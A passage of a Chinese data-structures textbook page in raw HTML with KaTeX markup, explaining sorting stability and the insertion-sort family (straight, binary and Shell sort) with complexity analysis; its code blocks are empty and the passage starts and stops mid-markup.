class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">R_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，其对应的关键字相同即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">key_{i} = key_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，且在排序前 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">R_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的前面，若使用某一排序算法排序后，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 仍然在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">R_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的前面，则称这个排序算法是稳定的，否则称排序算法是不稳定的。<strong>需要注意的是</strong>，算法是否具有稳定性并不能衡量一个算法的优劣，它主要是对算法的性质进行描述。如果待排序表中的关键字不允许重复，则排序结果是唯一的，那么选择排序算法时的稳定与否就无关紧要。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>对于不稳定的排序算法，只需举出一组关键字的实例，说明它的不稳定性即可</p>
</div>
<p>在排序过程中，根据数据元素是否完全在内存中，可将排序算法分为两类：</p>
<ul>
<li><strong>内部排序</strong>：是指在排序期间元素全部存放在内存中的排序</li>
<li><strong>外部排序</strong>：是指在排序期间元素无法全部同时存放在内存中，必须在排序的过程中根据要求不断地在内、外存之间移动的排序</li>
</ul>
<p>一般情况下，内部排序算法在执行过程中都要进行两种操作：比较和移动。通过比较两个关键字的大小，确定对应元素的前后关系，然后通过移动元素以达到有序。当然，并非所有的内部排序算法都要基于比较操作，事实上，基数排序就不基于比较。</p>
<p>每种排序算法都有各自的优缺点，适合在不同的环境下使用，就其全面性能而言，很难提出一种被认为是最好的算法。通常可以将排序算法分为插入排序、交换排序、选择排序、归并排序和基数排序五大类。内部排序算法的性能取决于算法的时间复杂度和空间复杂度，而时间复杂度一般是由比较和移动的次数决定的。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>大多数的内部排序算法只适用于顺序存储的线性表</p>
</div>
<h3> 插入排序</h3>
<p>插入排序是一种简单直观的排序方法，其 <strong>基本思想</strong> 是每次将一个待排序的记录按其关键字大小插入前面已排好序的子序列，直到全部记录插入完成。由插入排序的思想可以引申出三个重要的排序算法：直接插入排序、折半插入排序和希尔排序。</p>
<h4> 直接插入排序</h4>
<p>根据上面的插入排序思想，不难得出一种最简单也最直观的直接插入排序算法。假设在排序过程中，待排序表 <code>L[1...n]</code> 在某次排序过程中的某一时刻状态如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">有序序列 <code>L[1...i - 1]</code></th>
<th style="text-align:center"><code>L(i)</code></th>
<th style="text-align:center">无序序列 <code>L[i + l...n]</code></th>
</tr>
</thead>
</table>
<p>要将元素 <code>L(i)</code> 插入己有序的子序列 <code>L[1...i - 1]</code>，需要执行以下操作（为避免混淆，下面用 <code>L[]</code> 表示一个表，而用 <code>L()</code> 表示一个元素）：</p>
<ol>
<li>查找出 <code>L(i)</code> 在 <code>L[1...i - l]</code> 中的插入位置 <code>k</code></li>
<li>将 <code>L[k...i - l]</code> 中的所有元素依次后移一个位置</li>
<li>将 <code>L(i)</code> 复制到 <code>L(k)</code></li>
</ol>
<p>为了实现对 <code>L[1...n]</code> 的排序，可以将 <code>L(2)~L(n)</code> 依次插入前面已排好序的子序列，初始 <code>L[1]</code> 可以视为是一个已排好序的子序列。上述操作执行 <code>n - 1</code> 次就能得到一个有序的表。插入排序在实现上通常采用就地排序（空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>），因而在从后向前的比较过程中，需要反复把己排序元素逐步向后挪位，为新元素提供插入空间。</p>
<p>下面是直接插入排序的代码，其中再次用到了前面提到的 “哨兵”（作用相同）。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>直接插入排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li>
<p><strong>空间效率</strong>：仅使用了常数个辅助单元，因而空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p>
</li>
<li>
<p><strong>时间效率</strong>：在排序过程中，向有序子表中逐个地插入元素的操作进行了 <code>n - 1</code> 趟，每趟操作都分为比较关键字和移动元素，而比较次数和移动次数取决于待排序表的初始状态</p>
<p>在最好情况下，表中元素已经有序，此时每插入一个元素，都只需比较一次而不用移动元素，因而时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>在最坏情况下，表中元素顺序刚好与排序结果中的元素顺序相反（逆序），总的比较次数达到最大，总的移动次数也达到最大，总的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
<p>平均情况下，考虑待排序表中元素是随机的，此时可以取上述最好与最坏情况的平均值作为平均情况下的时间复杂度，总的比较次数与总的移动次数均约为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup><mi mathvariant="normal">/</mi><mn>4</mn></mrow><annotation encoding="application/x-tex">n^{2} / 4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord">/4</span></span></span></span>。因此，直接插入排序算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>稳定性</strong>：由于每次插入元素时总是从后向前先比较再移动，所以不会出现相同元素相对位置发生变化的情况，即直接插入排序是一个稳定的排序方法</p>
</li>
<li>
<p><strong>适用性</strong>：直接插入排序算法适用于顺序存储和链式存储的线性表。为链式存储时，可以从前往后查找指定元素的位置</p>
</li>
</ul>
<h4> 折半插入排序</h4>
<p>从直接插入排序算法中，不难看出每趟插入的过程中都进行了两项工作：一从前面的有序子表中查找出待插入元素应该被插入的位置；二给插入位置腾出空间，将待插入元素复制到表中的插入位置。注意到在该算法中，总是边比较边移动元素。下面将比较和移动操作分离，即先折半查找出元素的待插入位置，然后统一地移动待插入位置之后的所有元素。当排序表为顺序表时，可以对直接插入排序算法做如下改进：由于是顺序存储的线性表，所以查找有序子表时可以用折半查找来实现。确定待插入位置后，就可统一地向后移动元素。算法代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>从上述算法中，不难看出折半插入排序仅减少了比较元素的次数，约为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，该比较次数与待排序表的初始状态无关，仅取决于表中的元素个数 <code>n</code>；而元素的移动次数并未改变，它依赖于待排序表的初始状态。因此，折半插入排序的时间复杂度仍为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，但对于数据量不是很大的排序表，折半插入排序往往能表现出很好的性能。折半插入排序是一种稳定的排序方法。</p>
<h4> 希尔排序</h4>
<p>从前面的分析可知，直接插入排序算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，但若待排序列为 “正序” 时，其时间效率可提高至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，由此可见它更适用于基本有序的排序表和数据量不大的排序表。希尔排序正是基于这两点分析对直接插入排序进行改进而得来的，又称 <strong>缩小增量排序。</strong></p>
<p>希尔排序的 <strong>基本思想</strong> 是：先将待排序表分割成若干形如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mi>d</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>2</mn><mi>d</mi><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mi>k</mi><mi>d</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">L[i, i + d, i + 2d, \dotsc, i + kd]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">d</span><span class="mclose">]</span></span></span></span> 的 “特殊” 子表，即把相隔某个 “增量” 的记录组成一个子表，对各个子表分别进行直接插入排序，当整个表中的元素已呈 “基本有序” 时，再对全体记录进行一次直接插入排序。</p>
<p>希尔排序的 <strong>过程如下</strong>：先取一个小于 <code>n</code> 的步长 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">d_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，把表中的全部记录分成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">d_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 组，所有距离为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">d_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的倍数的记录放在同一组，在各组内进行直接插入排序；然后取第二个步长 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>2</mn></msub><mo>&lt;</mo><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">d_{2} &lt; d_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，重复上述过程，直到所取到的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>t</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d_{t} = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，即所有记录已放在同一组中，再进行直接插入排序，由于此时已经具有较好的局部有序性，故可以很快得到最终结果。到目前为止，尚未求得一个最好的增量序列。</p>
<p>希尔排序算法的代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>希尔排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：仅使用了常数个辅助单元，因而空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：由于希尔排序的时间复杂度依赖于增量序列的函数，这涉及数学上尚未解决的难题，所以其时间复杂度分析比较困难。当 <code>n</code> 在某个特定范围时，希尔排序的时间复杂度约为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>1.3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{1.3})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 